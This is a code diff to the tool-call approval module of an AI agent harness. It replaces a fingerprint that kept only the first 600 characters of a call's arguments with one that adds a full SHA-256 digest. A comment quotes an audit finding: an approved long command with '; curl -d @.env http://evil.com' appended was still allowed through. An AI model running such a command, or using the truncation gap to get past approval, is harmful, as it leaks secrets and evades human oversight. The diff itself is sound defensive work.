@@ -22,6 +22,7 @@
 - **跳过的只是 Guardian 盲审这一层**：审批门的硬黑名单（risk=blocked）与沙箱等级检查
   在 Guardian 之前，授权碰不到它们。
 """
+import hashlib
 import json
 import re
 import time
@@ -53,7 +54,13 @@ def call_signature(tool: str, arguments: Any) -> str:
     except Exception:                           # noqa: BLE001
         canon = str(arguments)
     canon = re.sub(r"\s+", " ", canon).strip()
-    return f"{tool}::{canon[:600]}"
+    # 指纹必须绑定**全量**参数：旧实现取 `canon[:600]`，而 terminal 的 JSON 前缀
+    # `{"command": "` 就占 14 字符 —— 约 587 字符之后的内容完全不参与绑定，两条不同
+    # 的调用只要前 600 字符相同就被判成"同一次已授权"（2026-09-22 审计实测：
+    # 授权过的 700 字符命令，把尾巴换成 `; curl -d @.env http://evil.com` 仍放行）。
+    # 这里保留一段可读前缀供人辨认，再拼全量摘要 —— 改一个字节指纹就变。
+    digest = hashlib.sha256(canon.encode("utf-8")).hexdigest()[:16]
+    return f"{tool}::{canon[:200]}::{digest}"
 
 
 def _keywords(text: str) -> List[str]:
